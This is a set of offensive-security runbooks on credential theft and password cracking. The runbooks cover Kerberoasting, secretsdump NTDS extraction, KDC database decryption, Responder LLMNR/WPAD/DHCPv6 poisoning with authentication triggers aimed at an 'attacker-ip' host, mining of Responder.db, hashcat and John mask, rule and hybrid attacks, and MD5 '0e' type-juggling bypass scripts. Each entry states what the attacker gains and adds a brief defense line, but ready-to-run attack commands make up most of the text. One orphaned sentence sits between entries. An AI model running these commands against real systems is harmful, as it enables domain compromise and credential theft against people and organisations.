john --wordlist=all.lst --rules --salts=-2 *passwd*
description:
This runbook narrows cracking scope in John by filtering target accounts by shell, user, and salt population. It is used to prioritize high-value and high-likelihood crack targets first.

Using #--shells, #--users, and #--salts improves early crack yield and reduces unnecessary compute on lower-priority segments.

  1. Prioritize accounts: isolate user cohorts (privileged, service, non-local) for focused cracking.
  2. Exploit salt distribution: crack high-population salts first to maximize early return.
  3. Backfill remaining scope: run inverse salt/user filters for full coverage.
  • Tool Location/Source: #john account/salt filter options in standard JtR builds.
  • Attack pre-requisite: hash input that includes account metadata suitable for shell/user filtering.
  • What attacker gain: faster initial credential recovery and better campaign sequencing.
  • Detection/Defense opsec: monitor privileged account authentication exposure and enforce stronger controls for high-value identities.

Core Commands:

john --wordlist=all.lst --rules --users=0 *passwd*
john --wordlist=all.lst --rules --users=-root,solar *passwd*
john --wordlist=all.lst --rules --salts=2 *passwd*
john --wordlist=all.lst --rules --salts=-2 *passwd*

label: Kerberoast and Credential Material Pipeline
command:
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
hashcat -m 7500 kerberos-asreq.txt wordlist.txt
hashcat -m 5600 smb-ntlmv2.txt wordlist.txt
secretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>
hashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt
description:
This runbook is a broad credential-material acquisition chain spanning SPN ticket extraction, targeted Kerberoast variants, captured challenge-response artifacts, and domain dump cracking workflows.

It combines tooling such as #GetUserSPNs.py, #Rubeus, #targetedKerberoast.py, #Responder, and #secretsdump.py with format-specific cracking modes in #hashcat and #john.

  1. Collect Kerberos/service material: request TGS tickets (standard or targeted) and gather AS-REQ/NetNTLM captures where available.
  2. Acquire domain hash stores: dump NTDS-derived hashes through privileged AD extraction paths.
  3. Crack by format family: route each artifact type to matching hashcat/JtR mode for efficient offline recovery.
  • Tool Location/Source: Impacket examples (#GetUserSPNs.py, #secretsdump.py), #Rubeus, #Responder, #hashcat, #john.
  • Attack pre-requisite: AD reachability and sufficient privileges/positioning for ticket requests, capture infrastructure, or directory replication extraction over TCP 88/445/389.
  • What attacker gain: crackable Kerberos/NTLM material leading to service account compromise, privilege escalation, and potential domain dominance.
  • Detection/Defense opsec: monitor anomalous TGS requests, disable weak service account passwords, enforce gMSA where possible, enable SMB signing, and detect DCSync/replication abuse.

Core Commands (subset):

GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
hashcat -m 7500 kerberos-asreq.txt wordlist.txt
hashcat -m 5600 smb-ntlmv2.txt wordlist.txt

label: Kerberos KDC Dump Decryption Audit
command:
sudo kdb5_util dump -b7 kdc.dump
cp /etc/krb5kdc/stash stash
hprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP "23:\\K(.+?)(?=:)" > rc4.hex
tr '[:upper:]' '[:lower:]' < rc4.hex > hash
john --format=krb5-23 hash
OMP_NUM_THREADS=4 john --format=krb5-23 --test
john --format=nt hash
description:
This runbook audits Kerberos database hashes by dumping encrypted KDC data, decrypting it with master key material, extracting target etypes, and cracking offline with John formats.

It bridges MIT/Heimdal toolchains (#kdb5_util, #hprop, #hpropd) into cracking workflows using #john --format=krb5-23 or modern #--format=nt.

  1. Dump encrypted KDC records: export Kerberos DB plus stash key material.
  2. Decrypt and extract etype hashes: parse usable crack material from decrypted output stream.
  3. Crack and benchmark formats: test cracking speed and recover plaintexts for audit findings.
  • Tool Location/Source: Kerberos admin utilities (#kdb5_util, #hprop) and #john.
  • Attack pre-requisite: privileged access to KDC host/filesystem (`kdc.dump`, `stash`) and authorized audit scope.
  • What attacker gain: crackable Kerberos credential material from central identity store.
  • Detection/Defense opsec: strict KDC host hardening, privileged access monitoring, and rapid credential reset for cracked principals.

Core Commands:

sudo kdb5_util dump -b7 kdc.dump
cp /etc/krb5kdc/stash stash
hprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP "23:\\K(.+?)(?=:)" > rc4.hex
tr '[:upper:]' '[:lower:]' < rc4.hex > hash
john --format=krb5-23 hash
OMP_NUM_THREADS=4 john --format=krb5-23 --test
john --format=nt hash

label: MD5 Suffix Micro Bruteforce Search
command:
python3 - <<'PY'
import hashlib
target = '2f2e2e'
candidate = 0
while True:
    plaintext = str(candidate)
    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if h[-len(target):] == target:
        print(f'plaintext:"{plaintext}", md5:{h}')
        break
    candidate += 1
PY
description:
This runbook brute-forces numeric plaintext candidates until an MD5 hash ends with a specified suffix. It is a constrained search pattern for edge-case hash challenges and niche validation tasks.

The approach iterates integers, computes MD5, and checks suffix match condition against target trailing hex bytes.

  1. Define target suffix: set expected trailing hash fragment.
  2. Iterate candidate space: compute MD5 for sequential candidate values.
  3. Stop on first match: return plaintext and full hash once suffix condition is satisfied.
  • Tool Location/Source: Python standard library #hashlib.
  • Attack pre-requisite: known suffix target and practical candidate domain constraints.
  • What attacker gain: candidate plaintext that satisfies hash suffix condition for the tested domain.
  • Detection/Defense opsec: use modern password hashing (Argon2/bcrypt/scrypt) and avoid weak MD5 usage in security logic.

Core Command:

python3 - <<'PY'
import hashlib
target = '2f2e2e'
candidate = 0
while True:
    plaintext = str(candidate)
    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if h[-len(target):] == target:
        print(f'plaintext:"{plaintext}", md5:{h}')
        break
    candidate += 1
PY

The pipeline uses #statsgen.py to extract mask frequencies, #maskgen.py to produce target-time optimized `.hcmask` sets, then executes with #hashcat -a 3.

label: Parallel MD5 0e Loose Comparison Hunt
command:
python3 - <<'PY'
import hashlib
from multiprocessing import Process, Queue, cpu_count

def loose_comparison(queue, num):
    target = '0e'
    plaintext = f"a_prefix{str(num)}a_suffix"
    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if h[:len(target)] == target and not any(x in "abcdef" for x in h[2:]):
        print('plaintext: ' + plaintext + ', md5: ' + h)
        queue.put("done")

def worker(queue, thread_i, threads):
    for num in range(thread_i, 100**50, threads):
        loose_comparison(queue, num)

def main():
    queue = Queue()
    threads = cpu_count()
    for thread_i in range(threads):
        proc = Process(target=worker, args=(queue, thread_i, threads))
        proc.daemon = True
        proc.start()
    while queue.empty():
        pass

main()
PY
description:
This runbook performs parallel search for MD5 digests matching weak loose-comparison patterns (`0e...` with numeric tail). It targets edge cases in insecure string-to-number comparison logic.

The workflow uses multiprocessing workers to partition numeric search space and stop on first qualifying digest.

  1. Define loose-comparison condition: hash starts with `0e` and remaining characters are numeric-only.
  2. Distribute search workload: worker processes split candidate ranges by CPU count.
  3. Terminate on first hit: shared queue signals successful match and exits search loop.
  • Tool Location/Source: Python standard libraries #hashlib and #multiprocessing.
  • Attack pre-requisite: target application path vulnerable to loose numeric/hash comparison behavior.
  • What attacker gain: candidate values that may bypass weak hash comparison checks in insecure code paths.
  • Detection/Defense opsec: enforce strict constant-time string comparison for hashes and avoid weak type juggling patterns.

Core Command:

python3 - <<'PY'
import hashlib
from multiprocessing import Process, Queue, cpu_count

def loose_comparison(queue, num):
    target = '0e'
    plaintext = f"a_prefix{str(num)}a_suffix"
    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if h[:len(target)] == target and not any(x in "abcdef" for x in h[2:]):
        print('plaintext: ' + plaintext + ', md5: ' + h)
        queue.put("done")

def worker(queue, thread_i, threads):
    for num in range(thread_i, 100**50, threads):
        loose_comparison(queue, num)

def main():
    queue = Queue()
    threads = cpu_count()
    for thread_i in range(threads):
        proc = Process(target=worker, args=(queue, thread_i, threads))
        proc.daemon = True
        proc.start()
    while queue.empty():
        pass

main()
PY

label: Policy Masks and Rule Engineering
command:
python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o complexity.hcmask
python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o noncompliant.hcmask -q --noncompliant
python rulegen.py --verbose --password P@55w0rd123
python rulegen.py leaked-passwords.txt -q -b analysis
hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r analysis-sorted.rule
description:
This runbook uses PACK to convert known password policy constraints into executable mask sets, then derives reusable mutation rules from recovered credential data. It is designed for high-efficiency offline cracking where unrestricted brute-force is computationally wasteful.

#policygen.py generates compliant or non-compliant mask collections, while #rulegen.py extracts transformation logic from leaked/cracked passwords and feeds those rules back into #hashcat.

  1. Model policy constraints: encode minimum/maximum complexity into mask generation.
  2. Generate rule intelligence: reverse likely source words and transformations from known plaintext samples.
  3. Operationalize learned rules: apply sorted output rules in focused hashcat straight attacks.
  • Tool Location/Source: local PACK utilities in `docs/sources-runbooks/password-cracking/pack/` (#policygen.py, #rulegen.py), plus #hashcat.
  • Attack pre-requisite: known or inferred policy constraints, representative cracked/leaked password corpus, and correct hash mode selection.
  • What attacker gain: smaller but higher-value candidate space and target-specific rules that improve crack rate on remaining hashes.
  • Detection/Defense opsec: enforce long random passphrases, disable predictable composition habits, and rotate passwords quickly after exposure indicators.

Core Commands:

python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o complexity.hcmask
python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o noncompliant.hcmask -q --noncompliant
python rulegen.py --verbose --password P@55w0rd123
python rulegen.py leaked-passwords.txt -q -b analysis
hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r analysis-sorted.rule

label: Random Rule Discovery and Harvesting
command:
hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --generate-rules=10000 --generate-rules-func-min=1 --generate-rules-func-max=4 --generate-rules-func-sel=ioTlc
hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --debug-mode=1 --debug-file=matched.rule
echo "WORd" | hashcat --stdout -j 'c'
description:
This runbook is an iterative optimization technique: generate large random rule sets, execute them against target hashes, and retain only rules that produce successful cracks.

It combines #hashcat --generate-rules with debug extraction (#--debug-mode, #--debug-file) to build an evidence-backed, target-specific mutation corpus.

  1. Generate exploratory rule-space: produce random rule combinations bounded by operator/function constraints.
  2. Execute and capture wins: run against target hashes while persisting matched rules to debug output.
  3. Recycle successful rules: promote matched rules into follow-on optimized cracking passes.
  • Tool Location/Source: #hashcat rule engine and local rule documentation.
  • Attack pre-requisite: baseline cracked output or a target set where mutation discovery is justified by remaining uncracked hashes.
  • What attacker gain: custom high-signal rule files tuned to the target’s real password transformation behavior.
  • Detection/Defense opsec: break attacker feedback loops with strong unique passwords and forced reset after credential exposure events.

Core Commands:

hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --generate-rules=10000 --generate-rules-func-min=1 --generate-rules-func-max=4 --generate-rules-func-sel=ioTlc
hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --debug-mode=1 --debug-file=matched.rule
echo "WORd" | hashcat --stdout -j 'c'

label: Responder Capture to Crack Mapping
command:
sudo python3 Responder.py -I eth0 -b
ldapsearch -H ldap://attacker-ip -D "CN=user,DC=corp,DC=local" -w password
dsquery user -d attacker-ip
hashcat -m 5600 smb-ntlmv2.txt wordlist.txt
hashcat -m 7500 kerberos-asreq.txt wordlist.txt
description:
This runbook links protocol-triggered credential captures in Responder to immediate offline cracking modes. It is intended for rapid conversion of captured artifacts into recoverable credentials.

It combines active capture paths (HTTP Basic/NTLM, LDAP, RDP, WinRM triggers) with direct cracking handoff to #hashcat modes such as NetNTLMv2 and Kerberos AS-REQ.

  1. Trigger protocol auth flows: induce victim systems/tools to authenticate toward attacker-controlled responder services.
  2. Collect and classify artifact type: map captures by protocol and hash family.
  3. Run matching crack mode: execute format-specific offline cracking immediately.
  • Tool Location/Source: #Responder.py, #hashcat, protocol trigger tooling (`ldapsearch`, `dsquery`).
  • Attack pre-requisite: network position allowing auth interception/poisoning and reachable victim services over relevant ports (for example TCP 80/389/3389/5985).
  • What attacker gain: crackable NetNTLMv2/AS-REQ artifacts and possible cleartext credentials.
  • Detection/Defense opsec: enforce SMB signing and modern auth controls, detect rogue responder behavior, and alert on unusual auth destination patterns.

Core Commands:

sudo python3 Responder.py -I eth0 -b
ldapsearch -H ldap://attacker-ip -D "CN=user,DC=corp,DC=local" -w password
dsquery user -d attacker-ip
hashcat -m 5600 smb-ntlmv2.txt wordlist.txt
hashcat -m 7500 kerberos-asreq.txt wordlist.txt

label: Responder SQLite Artifact Mining
command:
sqlite3 Responder.db
.tables
SELECT * FROM hashes;
.mode csv
.output hashes.csv
SELECT * FROM hashes;
.quit
description:
This runbook extracts and normalizes captured credential intelligence from Responder’s SQLite store and log structure for cracking queues, reporting, and correlation.

It focuses on #Responder.db interrogation with #sqlite3, table inspection, and CSV export for downstream automation.

  1. Open local artifact database: inspect schema and captured entries.
  2. Query captured hashes: extract relevant records for cracking and incident documentation.
  3. Export structured evidence: serialize selected data to CSV for external tooling.
  • Tool Location/Source: #sqlite3 and local Responder artifact layout (`Responder.db`, `logs/`).
  • Attack pre-requisite: prior credential capture activity generating Responder database/log entries.
  • What attacker gain: organized credential artifact inventory and improved cracking queue management.
  • Detection/Defense opsec: protect and monitor systems for unauthorized credential-harvest tooling; centralize log integrity controls to detect tampering/exfiltration.

Core Commands:

sqlite3 Responder.db
.tables
SELECT * FROM hashes;
.mode csv
.output hashes.csv
SELECT * FROM hashes;
.quit

label: Responder Passive to Active Campaign
command:
sudo python3 Responder.py -I eth0 -A -v
sudo python3 Responder.py -I eth0 --dhcpv6 -v
sudo python3 Responder.py -I eth0 -Pvd
sudo python3 Responder.py -I eth0 -v
description:
This runbook stages Responder operations from low-noise passive analysis to active poisoning and WPAD/DHCPv6 abuse. It is designed to progressively escalate capture posture with better situational awareness.

The sequence starts with #Responder.py -A analysis mode, then activates targeted poisoning controls such as #--dhcpv6 and #-Pvd.

  1. Baseline traffic behavior: observe name-resolution/auth flows in passive mode.
  2. Escalate poisoning controls: enable DHCPv6 and WPAD-oriented response capabilities.
  3. Run active capture mode: perform full poisoning/capture operation and harvest credential artifacts.
  • Tool Location/Source: #Responder.py from local responder source set.
  • Attack pre-requisite: L2/L3 network position to influence victim broadcast/name-resolution behavior; reachable victim endpoints and services over relevant ports (for example TCP 80/445/3389 and DHCPv6 paths).
  • What attacker gain: captured NTLM/Kerberos/cleartext authentication artifacts for offline cracking or relay chains.
  • Detection/Defense opsec: disable LLMNR/NBT-NS where possible, enforce SMB signing, deploy DHCPv6 guards, monitor rogue responder signatures and abnormal auth failures.

Core Commands:

sudo python3 Responder.py -I eth0 -A -v
sudo python3 Responder.py -I eth0 --dhcpv6 -v
sudo python3 Responder.py -I eth0 -Pvd
sudo python3 Responder.py -I eth0 -v

label: Hashcat Dictionary plus Rules Baseline
command:
hashcat -a 0 -m 1000 hashes.ntlm rockyou.txt -r rules/best66.rule
hashcat -a 0 -m 0 hashes.md5 wordlist.txt -r rules/best66.rule
hashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only -S
description:
This runbook establishes the first production cracking pass using curated dictionaries plus deterministic rule amplification. It is the highest-yield starting point for most real assessments because it targets human password behavior before expensive brute-force phases.

The workflow pairs #hashcat -a 0 with rulesets (for example #best66.rule) and optionally enables #-S when candidate generation bottlenecks occur (tiny base list, huge rules, slow/salted targets).

  1. Set cracking mode: choose exact hash mode and baseline dictionary based on triage output.
  2. Amplify candidates: apply vetted rules to expand probable user transformations (case flips, suffix digits, symbol substitutions).
  3. Optimize generation path: for small lists and large rule stacks, enable #-S to shift candidate generation behavior and improve feed efficiency.
  • Tool Location/Source: #hashcat (`/usr/bin/hashcat` on Kali), stock and custom rule files in the local profile folder (`hashcat/rules-*`).
  • Attack pre-requisite: correctly identified hash mode, valid hash list, and representative wordlist/rule strategy aligned to target context.
  • What attacker gain: first-wave credential recovery with minimal cost, producing recovered passwords that can seed follow-on loopback/rulegen campaigns.
  • Detection/Defense opsec: strengthen password policy against predictable patterns; monitor for upstream credential-theft vectors (LSASS, AD dumps, relay tooling) that feed offline cracking operations.

Core Commands:

hashcat -a 0 -m 1000 hashes.ntlm rockyou.txt -r rules/best66.rule
hashcat -a 0 -m 0 hashes.md5 wordlist.txt -r rules/best66.rule
hashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only -S

label: Structured Mask and Increment Cracking
command:
hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?l?d
hashcat -a 3 -m 1000 hashes.ntlm -1 ?d?s ?u?l?l?l?l?l?l?l?1
hashcat -a 3 -m 1000 hashes.ntlm -i --increment-min=6 --increment-max=9 ?u?l?l?l?l?l?l?l?d
hashcat -a 3 hashes.txt mask_file.hcmask
description:
This runbook performs deterministic keyspace traversal using masks, custom charsets, and bounded increment ranges. It is used when password structure is partially known (capitalized word + digits, policy-driven composition, fixed lengths).

By leveraging #hashcat -a 3 with custom charsets and increment controls, the operator avoids random brute force and focuses on high-probability pattern space.

  1. Model expected format: encode real password shape assumptions into mask syntax (`?u`, `?l`, `?d`, `?s`).
  2. Constrain keyspace: use minimum/maximum length increment boundaries to control runtime explosion.
  3. Operationalize reusable masks: store prioritized masks in #.hcmask files for repeatable campaigns.
  • Tool Location/Source: #hashcat, local mask/rule docs in the profile source set, and optional precomputed mask files (`*.hcmask`).
  • Attack pre-requisite: accurate hash mode plus defensible assumptions about target password format and length policy.
  • What attacker gain: efficient cracking against structured password choices without exhausting full brute-force space.
  • Detection/Defense opsec: enforce long unpredictable passphrases and deny pattern-based policy leakage; monitor and block upstream hash extraction vectors.

Core Commands:

hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?l?d
hashcat -a 3 -m 1000 hashes.ntlm -1 ?d?s ?u?l?l?l?l?l?l?l?1
hashcat -a 3 -m 1000 hashes.ntlm -i --increment-min=6 --increment-max=9 ?u?l?l?l?l?l?l?l?d
hashcat -a 3 hashes.txt mask_file.hcmask

label: Hybrid Wordlist and Mask Attacks
command:
hashcat -a 6 -m 1000 hashes.ntlm wordlist.txt ?d?d?d?d
hashcat -a 7 -m 1000 hashes.ntlm ?d?d?d?d wordlist.txt
description:
This runbook targets passwords that combine a dictionary root with a structured prefix or suffix. It bridges the gap between pure dictionary attacks and full brute force.

With #hashcat -a 6 (wordlist+mask) and #hashcat -a 7 (mask+wordlist), the operator appends or prepends deterministic patterns such as years, counters, or short token blocks.

  1. Pick candidate root set: select high-confidence words from breach context, organization terms, or recovered passwords.
  2. Define structured append/prepend masks: encode likely numeric/symbolic layouts without opening full keyspace.
  3. Run both orientations: test suffix-heavy and prefix-heavy user habits independently.
  • Tool Location/Source: #hashcat hybrid modes from standard hashcat builds.
  • Attack pre-requisite: known hash mode, usable root wordlist, and realistic mask assumptions from target password style.
  • What attacker gain: higher crack rate on policy-driven passwords like `Word2025!` or `1234Word` that evade pure dictionary runs.
  • Detection/Defense opsec: enforce long passphrases and deny predictable numeric endings; monitor and remediate initial credential capture vectors.

Core Commands:

hashcat -a 6 -m 1000 hashes.ntlm wordlist.txt ?d?d?d?d
hashcat -a 7 -m 1000 hashes.ntlm ?d?d?d?d wordlist.txt
